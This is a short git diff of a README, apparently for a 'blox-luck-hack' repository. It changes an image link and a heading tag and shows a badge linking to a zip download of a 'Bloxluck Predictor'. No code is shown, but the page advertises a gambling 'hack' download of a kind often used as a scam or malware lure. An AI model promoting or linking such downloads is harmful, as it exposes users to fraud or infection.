@@ -1,7 +1,7 @@
-  <img src="![blox](https://github.com/user-attachments/assets/140ad0c5-bd04-4fe0-b830-2c6190af0501)
-" />
+ <img src="![blox](https://github.com/user-attachments/assets/32bf0c8a-c0c1-48e9-9ea9-d40ed22946fd)
+">
   </a>
-</p>
+</h1>
 <p align="center">
   <a href="https://github.com/tradescamv2/blox-luck-hack/archive/refs/heads/main.zip" target="_blank">
     <img src="https://img.shields.io/badge/Download-Bloxluck%20Predictor-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Bloxluck Predictor" />
